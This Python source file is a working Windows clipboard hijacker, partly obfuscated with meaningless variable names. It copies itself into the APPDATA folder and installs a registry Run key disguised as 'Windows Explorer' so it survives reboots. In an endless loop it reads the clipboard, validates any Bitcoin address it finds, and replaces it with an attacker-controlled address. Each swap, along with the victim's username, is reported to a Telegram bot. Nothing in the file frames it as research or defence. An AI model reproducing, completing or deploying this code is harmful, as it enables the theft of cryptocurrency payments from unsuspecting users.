import requests #line:1:import requests
import detailes #line:2:import detailes
import subprocess #line:3:import subprocess
import os #line:4:import os
import sys #line:5:import sys
def move():
    APPDATA = os.environ['appdata']
    new_file_name = os.environ['appdata'] + "\\" + os.path.basename(sys.argv[0])
    if not os.path.exists(new_file_name):
        #import urllib.request
        #urllib.request.urlretrieve(
        #    "https://media.istockphoto.com/photos/abstract-warning-of-a-detected-malware-program-picture-id1299483011",
        #    "pic.png")
        #subprocess.Popen("pic.png", shell=True)
        new_loc = os.path.join(APPDATA, os.path.basename(sys.argv[0]))
        subprocess.Popen(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Windows Explorer" /t REG_SZ /d "{new_file_name}"',shell=True)
        command = f'timeout 2 & move /y {os.path.basename(sys.argv[0])} {new_loc} & cd /d {APPDATA}\\ & {new_loc}'
        subprocess.Popen(command, shell=True)
        sys.exit(0)
def btcs ():#line:20:def btcs():
    from hashlib import sha256 #line:21:from hashlib import sha256
    import subprocess #line:22:import subprocess
    import detailes #line:23:import detailes
    O00OO0OOOOO0OO00O ='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'#line:24:digits58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    O00OO0OOOO0OO0000 =str (os .getenv ('username'))#line:25:pc_name = str(os.getenv('username'))
    def O000OO0OO0OOO0O00 (O0O0000O00000OOO0 ,OO0O0OO00O000O0OO ):#line:26:def decode_base58(bc, length):
        O0OOO0OOOO0OO0O00 =0 #line:27:n = 0
        for OOO0OO0OOOOO0OOO0 in O0O0000O00000OOO0 :#line:28:for char in bc:
            O0OOO0OOOO0OO0O00 =O0OOO0OOOO0OO0O00 *58 +O00OO0OOOOO0OO00O .index (OOO0OO0OOOOO0OOO0 )#line:29:n = n * 58 + digits58.index(char)
        return O0OOO0OOOO0OO0O00 .to_bytes (OO0O0OO00O000O0OO ,'big')#line:30:return n.to_bytes(length, 'big')
    def OO00OOO00OO0O000O (OOOO0OOOO000OOOO0 ):#line:33:def check_bc(bc):
        try :#line:34:try:
            OOO00O0OOO00OOO0O =O000OO0OO0OOO0O00 (OOOO0OOOO000OOOO0 ,25 )#line:35:bcbytes = decode_base58(bc, 25)
            return OOO00O0OOO00OOO0O [-4 :]==sha256 (sha256 (OOO00O0OOO00OOO0O [:-4 ]).digest ()).digest ()[:4 ]#line:36:return bcbytes[-4:] == sha256(sha256(bcbytes[:-4]).digest()).digest()[:4]
        except Exception :#line:37:except Exception:
            return False #line:38:return False
    OOO000OO0OO00OO00 =subprocess .Popen ('powershell -command "Get-Clipboard"',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:41:result = subprocess.Popen('powershell -command "Get-Clipboard"',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    OOO000OO0OO00OO00 =OOO000OO0OO00OO00 .stdout .read ()+OOO000OO0OO00OO00 .stderr .read ()#line:42:result = result.stdout.read() + result.stderr.read()
    OOO000OO0OO00OO00 =str (OOO000OO0OO00OO00 .strip (),"utf-8")#line:43:result = str(result.strip(),"utf-8")
    if '#'in OOO000OO0OO00OO00 or '('in OOO000OO0OO00OO00 or ')'in OOO000OO0OO00OO00 or '{'in OOO000OO0OO00OO00 or '}'in OOO000OO0OO00OO00 or '['in OOO000OO0OO00OO00 or ']'in OOO000OO0OO00OO00 or '"'in OOO000OO0OO00OO00 or "'"in OOO000OO0OO00OO00 :#line:44:if '#' in result or '(' in result or ')' in result or '{' in result or '}' in result or '[' in result or ']' in result or '"' in result or "'" in result:
        OOO000OO0OO00OO00 ='1'#line:45:result = '1'
    else :#line:46:else:
        OOO00O00OO0OOO000 =OO00OOO00OO0O000O (OOO000OO0OO00OO00 )#line:47:bitcoinadd = check_bc(result)
        if OOO00O00OO0OOO000 ==True :#line:48:if bitcoinadd==True:
            OO00O000O0O0000OO ='echo '+detailes .bitcoin +'| clip'#line:49:com = 'echo '+detailes.bitcoin+'| clip'
            subprocess .Popen (OO00O000O0O0000OO ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:50:subprocess.Popen(com,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            OOO00O00OOOOO0OO0 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=Bit Coin Addreas Changed\nFrom: "+OOO000OO0OO00OO00 +"\nTo: "+detailes .bitcoin +"\nDesktopName: "+O00OO0OOOO0OO0000 )#line:51:re = requests.post("https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=Bit Coin Addreas Changed\nFrom: "+result+"\nTo: "+detailes.bitcoin+"\nDesktopName: "+pc_name)
        else :#line:52:else:
            pass #line:53:pass
move ()#line:54:move()
while True :#line:55:while True:
    btcs ()